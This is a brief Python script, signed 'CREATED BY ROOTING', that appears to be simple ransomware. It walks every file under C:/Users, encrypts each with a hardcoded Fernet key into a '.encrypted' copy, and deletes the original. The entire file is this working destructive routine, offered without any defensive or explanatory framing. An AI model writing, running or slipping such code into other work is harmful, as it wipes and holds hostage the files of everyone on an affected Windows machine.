#CREATED BY ROOTING
import cryptography
from cryptography.fernet import Fernet
import os
key = "m1UC3tUviDsxlk0ng_QWwx38cVT-ThlwRLSE-OzSWuA="
def encrypt(x):
    input_file = x
    output_file = x+'.encrypted'
    with open(input_file, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(output_file, 'wb') as f:
        f.write(encrypted)
for r, d, f in os.walk("C:/Users"):
    for x in f:
        encrypt(os.path.join(r, x))
        os.remove(os.path.join(r, x))

#CREATED BY ROOTING